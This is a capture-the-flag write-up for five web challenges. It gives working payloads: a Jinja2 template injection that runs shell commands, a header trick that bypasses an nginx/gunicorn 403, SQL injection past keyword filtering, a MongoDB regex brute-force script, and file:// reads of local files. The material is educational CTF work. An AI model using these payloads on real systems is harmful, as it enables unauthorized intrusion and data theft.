## Challenge ninja
Filter: `- _ ,config ,os, RUNCMD, base`

Payload:
```
{{''[request.args.a][request.args.b][2][request.args.c]()[258]('cat+flag.txt',shell%3dTrue,stdout%3d-1).communicate()[0].strip()}}&a=__class__&b=__mro__&c=__subclasses__
```
Flag -> `flag{m0mmy_s33_1m_4_r34l_n1nj4}`

## Challenge Gatekeeping

Sep 1: Upload file `flag.txt.enc` to get `key_id`

key_id = 05d1dc92ce82cc09d9d7ff1ac9d5611d

Step 2: bypass 403 `/admin/key` to get key

Payload
```
GET /taidh/admin/key HTTP/1.1
key_id: 05d1dc92ce82cc09d9d7ff1ac9d5611d
SCRIPT_NAME: taidh
...
```
key = `b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3`

Explain: whenever request, nginx send this request to gunicorn. In gunicorn, when set `SCRIPT_NAME` it will append the path.
SCRIPT_NAME execute when `underscores_in_headers on`.

Final payload:
```py
from Crypto.Cipher import AES
import binascii

with open('dist/flag.txt.enc','rb') as f:
    key = binascii.unhexlify('b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3')
    data = f.read()
    iv = data[:AES.block_size]

    data = data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CFB, iv)

    print(cipher.decrypt(data))
```
Flag -> `flag{gunicorn_probably_should_not_do_that}`

## Challenge no-pass-needed
Step 1: Login with `username=admin'--&password=admin'--`
username just show `'`. Contiune login `username=taidadmin&password=admin'--` and it show taidh
=> it replace `admin`

Payload:
```
username=adadminmin'--&password=taidh
```
Flag -> `flag{wh0_n3ed5_a_p4ssw0rd_anyw4y}`

## Challenge securinotes

Run script on Console
```js
let flag = "flag{";
const list_char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}!@#{$_- ";

const count = (char) => {
  return new Promise((resolve,reject) => {
    setTimeout(() => {
      Meteor.call('notes.count',{
        body : {
          $regex :`${char}`
        }
      },function(err ,res ){
        if(err) reject(error);
        resolve(res);
      });
      });
  });
}

const brute_flag = async () => {
  for(let i=0; i<70;i++){
    for(let char of list_char){
      let res = await count(flag+char);
      if(res){
        flag += char;
        console.log(flag);
        break;
      }
    }
  }
}

brute_flag();
```
Flag -> `flag{4lly0Urb4s3}`

## Challenge scp-terminal
Step 1: 

file:///server/server.py#SCP-1 -> get source `server.py`

file:///server/scp_contain.py#SCP-1 -> get source `scp_contain.py`

file:///server/scp_secure.py#SCP-1 -> get source `scp_secure.py`

In source `server.py`, we can see flag at file `scp-31337.html`

Step 2: Access https://scp-wiki.wikidot.com/scp-455

![image](https://user-images.githubusercontent.com/54855855/133001150-c3769cea-89dc-4eac-befc-efe30b82e454.png)

Copy this html

Step 3: Custom above html
```js
<div class="scp-image-block block-right" style="width:300px;"><img src="file:///server/templates/scp-31337.html" style="width:300px;" alt="Wrecktophg4.jpg" class="image">
<div class="scp-image-caption" style="width:300px;">
<p>SCP-455 in the water</p>
</div>
</div>
```
Host above file on local with name `scp-1.html`.

Step 4:

On local run `php -S 0.0.0.0:1234`

Send `http://host:port/scp-1.html`

Step 5: View source and copy
![image](https://user-images.githubusercontent.com/54855855/133001493-bee55f0d-8466-49dd-a64a-92df60f263e8.png)

Send https://scp-terminal.foundation/site_19/8141ffdd234710a18eae7adf4c12ca8332f191a2.htm

Flag -> `flag{CSP_def3a7s_SCP_n0t_s0_s3cure_n0w_huh}`

## Thank
Writeup full I will upload at http://dauhoangtai.github.io later